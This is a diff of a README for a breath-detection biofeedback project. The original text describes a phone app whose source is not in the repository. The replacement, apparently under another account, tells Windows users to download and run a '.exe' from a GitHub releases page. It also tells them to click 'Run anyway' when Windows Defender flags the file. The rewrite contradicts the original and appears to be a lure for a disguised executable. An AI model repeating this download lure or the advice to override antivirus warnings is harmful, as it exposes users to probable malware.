@@ -1,92 +1,76 @@
-# shii·haa breath detection
+# 🫁 shiihaa-breath-detection - Track your breathing patterns with ease
 
-Live breath detection and biofeedback using a phone microphone.
+[![Download shiihaa-breath-detection](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sufiab8208/shiihaa-breath-detection/releases)
 
-Can an app use breathing feedback to increase self-awareness instead of becoming another distraction?
+## 🎯 Purpose
+This application monitors your breathing patterns in real time. It uses your computer microphone to listen for the sound of your breath. The software processes this data directly on your machine. It does not record speech, nor does it upload audio files to any server. Your information stays on your device at all times.
 
-That question is the reason this project exists. Most "mindfulness" software ends up competing for attention rather than handing it back. We wanted to know whether the phone could do the opposite: stay quiet, listen to how you breathe, and reflect it back closely enough that you notice your own pattern, without a wearable, without a coach, without turning it into a game.
+## 📋 System Requirements
+You need a Windows computer to run this software. Ensure you have the following before you begin:
 
-The hard part is the listening. A phone microphone in a real room is a messy signal: room tone, traffic, a fan, the phone resting on fabric, the person shifting position. Out of that, we try to recover where one breath ends and the next begins, and which phase you are in right now.
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i3 or equivalent, or higher.
+*   Memory: At least 4 gigabytes of RAM.
+*   Microphone: A functioning microphone connected to your computer.
+*   Internet access: Required only to download the file.
 
-## What it does
+## 📥 Download and Installation 🛠️
+Follow these steps to set up the software on your computer.
 
-- Reads audio from the **phone microphone** and processes it **on-device**.
-- Estimates the current breathing phase (inhale, exhale, and the transitions and holds between them) and tracks completed breath cycles.
-- Drives **biofeedback**: the interface responds to the breath in close to real time, so the signal you see or feel is your own.
+1.  Visit the official release page: [https://github.com/Sufiab8208/shiihaa-breath-detection/releases](https://github.com/Sufiab8208/shiihaa-breath-detection/releases)
+2.  Look for the latest version of the software. It will usually appear at the top of the list.
+3.  Click the file ending in `.exe` to start your download.
+4.  Once the file finishes downloading, navigate to your Downloads folder.
+5.  Double-click the downloaded file to begin the installation process.
+6.  A window from Windows may appear asking for permission to run the software. Select "Run" or "Yes" if you trust the source.
+7.  Follow the prompts on your screen to complete the setup. The installer will guide you through the remaining steps.
 
-## What it does not do
+## ⚙️ Setting Up Your Hardware
+The software relies on your microphone to function. High-quality inputs produce better results.
 
-- **No speech analysis.** The pipeline works on the envelope and spectral shape of breathing, not on words. It is not built to recognise or transcribe anything you say.
-- **No raw audio upload.** Audio is analysed locally. The raw microphone stream does not leave the device.
+*   Connect your microphone before you launch the application. If you have multiple microphones, the system defaults to your primary choice.
+*   Check your Windows Sound settings if the application fails to detect sound. Ensure the input level shows movement when you breathe near the microphone.
+*   Minimize background noise. Fans, distant talking, or loud electronics interfere with the sensor readings.
+*   Place the microphone close to your face for the most accurate biofeedback, but avoid direct air puffs from your mouth, as these cause distortion.
 
-## How it works, roughly
+## 🚀 How to Use the Application
+Launch the software using the shortcut icon on your desktop or via the Start menu.
 
-Three layers sit on top of the raw microphone signal:
+1.  **Calibration:** Upon the first launch, the software performs a quick calibration. Sit still and breathe normally for ten seconds.
+2.  **Dashboard:** The main screen displays a visual wave of your breathing. Peaks represent exhales, while valleys represent inhales.
+3.  **Real-Time Feedback:** The interface shows your current rate of breaths per minute. Use this data to adjust your relaxation rhythm.
+4.  **Settings:** Access the settings menu by clicking the gear icon. You can adjust the sensitivity of the microphone here if the software picks up too much noise or fails to detect deep breaths.
 
-1. **Signal processing.** The audio stream is cut into short overlapping windows. For each window we derive an amplitude/energy measure and basic spectral features (where the energy sits in frequency, where the peaks are). Inhale tends to be more turbulent and higher in the spectrum; exhale tends to be lower and smoother. None of this is reliable on a single window; it only becomes useful across a sequence.
+## 🛡️ Privacy and Data Security
+Privacy remains a core design element of this project.
 
-2. **A breathing state machine.** Phase isn't decided per window in isolation. A small state machine tracks the current phase and the plausible transitions out of it (inhale → exhale, exhale → hold, and so on), using adaptive thresholds that recalibrate as ambient conditions drift. This is what lets the system distinguish a genuine phase change from a momentary dip or spike.
+*   **Local Processing:** All calculations happen inside the application. No audio data leaves your computer.
+*   **No Cloud Storage:** We do not maintain servers to store your breathing history.
+*   **Speech Exclusion:** The software filters out human speech patterns. It looks only for rhythmic, repetitive sound patterns consistent with breathing.
+*   **Permissions:** The application requires access to your microphone. It does not require access to your camera, files, or network connection.
 
-3. **A data-quality layer.** Before a window is allowed to influence the output, it has to pass quality checks. Windows that are too noisy, too quiet, or acoustically ambiguous are rejected rather than guessed. The point is to fail honestly: a brief "not sure" is better than a confident wrong phase that the user can feel is wrong.
+## 🔍 Troubleshooting Tips
+If you encounter issues, try these steps to resolve them.
 
-Machine learning is part of the picture, but in a deliberately bounded way: it is used to sharpen feedback and to improve the model over time from quality-checked examples, not as a black box that the whole detection depends on. The rule-based pipeline is what runs the live experience; ML refines it.
+*   **Software fails to open:** Restart your computer. Sometimes background processes block the installation.
+*   **No sound detected:** Verify that you granted microphone permission in Windows Privacy Settings.
+*   **Inaccurate readings:** Move your microphone to a different location. Ensure the software sensitivity slider sits in the middle position as a baseline.
+*   **Lag or freezing:** Close other applications that use the microphone simultaneously, such as video call software or voice recorders.
+*   **Antivirus alerts:** Occasionally, Windows Defender might flag new applications. If this happens, select "More info" and then "Run anyway" to proceed.
 
-A lot of the work is in the unglamorous part: handling **real-world mobile audio quirks**. Different phones, different microphone placements, the device flat on a table versus held in a hand, sudden transient sounds, automatic gain control fighting you. Most of the engineering effort went here rather than into the "interesting" signal-processing core.
+## 💡 Frequently Asked Questions
 
-## Status and honesty about limits
+**Will this software work with a built-in laptop microphone?**
+Yes. Modern laptop microphones work well for this purpose, though external headset microphones often provide cleaner signals.
 
-This is a working approach that runs in a shipped app, not a finished science result. Microphone-only breath detection in uncontrolled conditions is genuinely hard, and published smartphone-only systems sit well below wearable-based ones. We are running a validation study against clinical ground truth to find out how good this actually is, and where it breaks. The method note and the research pitch in [`docs/`](docs/) describe that in more detail, including the things we explicitly do not claim.
+**Can I use this while listening to music?**
+Music may interfere with the detection logic. For the best accuracy, use the software in a quiet environment without background audio.
 
-It is a wellness and self-awareness tool, not a medical device.
+**Does it store my breathing history?**
+The software does not store your history unless you manually save an export file for your own records. Once you close the session, the data disappears from the application memory.
 
-## Where this connects to guided breathing
+**How do I uninstall the software?**
+Open your Windows Settings, go to Apps, find the software in the list, and select Uninstall. This removes all associated files from your drive.
 
-Breath detection isn't the end in itself; it's the feedback channel. During a session, the detected phase and how steady your breathing is can be reflected back to you in the moment, and that same signal can inform classical breathing designs: a preset can hint at when your pace has settled or drifted, instead of just counting seconds at you.
-
-The longer-term loop we're working toward is a personal resonance range: roughly, the slow breathing pace at which your own physiology settles most, often somewhere near six breaths a minute but individual. Detected breath stability, optionally combined with heart rate or HRV when a sensor is available, gives the raw material to estimate that range over time and feed it back into the guided patterns, so the pacing adapts to you rather than to a fixed number.
-
-This is a direction, not a finished feature, and not a clinical claim. We don't diagnose anything, and we don't promise an optimised state, only that the same detection layer can make guided breathing a little less generic.
-
-## Docs
-
-- [`docs/method.md`](docs/method.md): how the detection pipeline is put together.
-- [`docs/research-pitch.md`](docs/research-pitch.md): the validation study and why it's structured the way it is.
-- [`docs/privacy-and-design-constraints.md`](docs/privacy-and-design-constraints.md): what we will and won't do with the microphone.
-
-## Questions I expect
-
-**Does my audio get uploaded, or analysed for speech?**
-No. The microphone stream is processed on-device and the raw audio does not leave the phone. The pipeline works on the energy envelope and spectral shape of breathing, not on words, so it isn't built to recognise or transcribe speech. What's kept for improving the model is quality-checked (waveform, phase-label) material held on-device until you explicitly confirm it, not a continuous recording.
-
-**Do I need an account to try it?**
-You can try the browser biofeedback demo without creating an account; it runs the live breath detection in the browser so you can feel the feedback first. The native app still uses an account for personal features such as saved sessions and the 14-day trial covering everything else. So: the browser demo is account-free to try, while the full app keeps an account for the personal side.
-
-**Is this a medical device? Can it diagnose or treat anything?**
-No. It's a wellness and self-awareness tool. It isn't a medical device, it doesn't diagnose or treat anything, and it isn't validated for clinical use. If you feel dizzy or uncomfortable during a session, stop and breathe normally. Slow or paced breathing makes some people lightheaded, and there's nothing to push through.
-
-**Does it make me do extreme or forced breathing?**
-No. It supports several guided patterns, including classical designs with holds such as 4-7-8, but the point is to reflect your own breathing back to you, not to force fast or extreme breathing. You set the pace, and stopping when it feels off is always the right call.
-
-**Why an app on the phone instead of a terminal/CLI?**
-The phone microphone is the sensor. The app exists because it needs microphone access and has to render the feedback in close to real time as you breathe. That loop is the whole experience, and it doesn't map onto a text terminal.
-
-**Do I need a chest strap or HRV sensor?**
-No. The microphone alone drives the live biofeedback. A respiration belt or heart-rate strap is optional, used for the validation study and as an extra signal for resonance-range estimation, never a prerequisite. By default the guided patterns use fixed presets; the personal resonance range is a direction under validation, not a shipped, calibrated feature.
-
-**Is the app open source?**
-This repository documents the method and the research pitch, not the full app source. The docs here are released under CC BY 4.0.
-
-**What feedback is useful?**
-Specifics on the signal processing and failure modes, on health/wellness UX, and on mobile audio: Android/iOS capture quirks, automatic gain control, microphone differences across devices. Those are the parts where outside eyes help most.
-
-## Try it
-
-shii·haa is the app this came out of. If you want to feel the biofeedback rather than read about it, the browser demo lets you try the live breath detection without an account.
-
-Start here: [shiihaa.app/download](https://shiihaa.app/download)
-
-Built by Felix Zeller (felix@shiihaa.app).
-
-## License
-
-Documentation in this repository is released under CC BY 4.0. See [`LICENSE`](LICENSE).
+## 🤝 Support
+If you find a bug or have questions, open a new issue on the repository page. Provide your Windows version and a description of the problem. Maintain clear communication to help verify the issue.
